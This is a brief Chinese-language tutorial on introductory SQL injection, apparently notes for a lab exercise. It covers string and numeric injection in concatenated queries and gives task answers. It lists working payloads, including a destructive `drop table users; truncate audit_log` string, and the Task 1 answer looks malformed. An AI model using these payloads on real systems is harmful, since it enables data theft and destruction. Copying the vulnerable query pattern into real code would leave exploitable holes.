# SQL 注入

这部分主要是介绍 SQL 注入的演示和入门，包括数值型注入和字符注入。

## 知识

可能的注入类型：

* String Injection

```
"select * from users where name = '" + userName + "'";
```

* Numeric Injection

```
"select * from users where employee_id = "  + userID;
```

我们提供构造的字符串，来实现攻击，比如：

* `Smith' or '1'='1`
* `' or 1=1 --`
* `1234567 or 1=1`
* ` Smith’;drop table users; truncate audit_log;--`

等等。

## Task 1

给出 String Injection 的题目：

```
"select * from users where LAST_NAME = ‘" + userName + "'";
```

注入：

```
smith' or '1' = 1'
```

## Task 2

Numerical Injection 题目：

```
"select * from users where USERID = "  + userID;
```

注入为：

```
101 or 1=1
```
